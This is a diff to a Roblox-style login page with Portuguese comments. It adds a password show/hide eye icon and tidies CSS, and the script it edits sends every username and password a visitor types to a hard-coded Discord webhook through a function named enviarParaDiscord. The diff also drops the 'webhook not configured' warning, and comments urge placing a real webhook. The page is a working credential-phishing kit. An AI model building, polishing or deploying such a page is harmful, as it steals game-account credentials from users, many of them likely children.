@@ -22,12 +22,11 @@
       overflow: hidden;
     }
 
-    /* Overlay escuro para melhorar legibilidade (estilo Roblox moderno) */
     body::before {
       content: "";
       position: fixed;
       inset: 0;
-      background: rgba(0, 0, 0, 0.45); /* escurece levemente o fundo */
+      background: rgba(0, 0, 0, 0.45);
       z-index: -1;
     }
 
@@ -65,6 +64,7 @@
     .input-group {
       margin-bottom: 24px;
       text-align: left;
+      position: relative;
     }
 
     label {
@@ -77,7 +77,7 @@
 
     input {
       width: 100%;
-      padding: 14px 16px;
+      padding: 14px 48px 14px 16px;   /* espaço à direita pro ícone */
       border: 1px solid #3a3a3a;
       border-radius: 6px;
       background: #111114;
@@ -90,6 +90,22 @@
       outline: none;
       border-color: #00a2ff;
       box-shadow: 0 0 0 3px rgba(0, 162, 255, 0.3);
+    }
+
+    .eye-icon {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-12%);
+      font-size: 20px;
+      cursor: pointer;
+      user-select: none;
+      color: #aaa;
+      transition: color 0.2s;
+    }
+
+    .eye-icon:hover {
+      color: #00a2ff;
     }
 
     .btn-login {
@@ -112,10 +128,7 @@
       box-shadow: 0 8px 20px rgba(0, 130, 255, 0.4);
     }
 
-    .btn-login:active {
-      transform: translateY(0);
-    }
-
+    .btn-login:active { transform: translateY(0); }
     .btn-login:disabled {
       background: #444;
       cursor: not-allowed;
@@ -191,6 +204,7 @@
   <div class="input-group">
     <label for="password">Senha</label>
     <input type="password" id="password" placeholder="" autocomplete="off">
+    <span class="eye-icon" id="togglePassword">👁️</span>
   </div>
 
   <button class="btn-login" id="loginBtn">Entrar</button>
@@ -203,12 +217,24 @@
 </div>
 
 <script>
+  // Toggle senha visível / oculta + troca de emoji
+  const passwordInput = document.getElementById('password');
+  const toggleIcon = document.getElementById('togglePassword');
+
+  toggleIcon.addEventListener('click', () => {
+    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+    passwordInput.setAttribute('type', type);
+
+    // Troca entre olho e macaco tapando os olhos
+    toggleIcon.textContent = type === 'text' ? '🙈' : '👁️';
+  });
+
+  // resto do código (login + webhook) continua igual
   const loginBtn = document.getElementById('loginBtn');
   const errorMsg = document.getElementById('errorMsg');
   const usernameInput = document.getElementById('username');
-  const passwordInput = document.getElementById('password');
 
-  // SEU WEBHOOK AQUI (não esqueça de trocar!)
+  // COLOQUE SEU WEBHOOK REAL AQUI ↓↓↓
   const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1474804412965978274/aQAej8nqhjGJMP_FBvbJM84EmTaHdj9bWL9wIvibBh3oHhSbfVBiuMrVGxnY5bESCnVy";
 
   async function enviarParaDiscord(username, password) {
@@ -244,9 +270,7 @@
     loginBtn.disabled = true;
     loginBtn.textContent = "Entrando...";
 
-    if (DISCORD_WEBHOOK_URL.includes("SEU_ID")) {
-      console.warn("Webhook não configurado! Troque o URL no código.");
-    } else {
+    if (!DISCORD_WEBHOOK_URL.includes("SEU_ID")) {
       await enviarParaDiscord(username, password);
     }
 
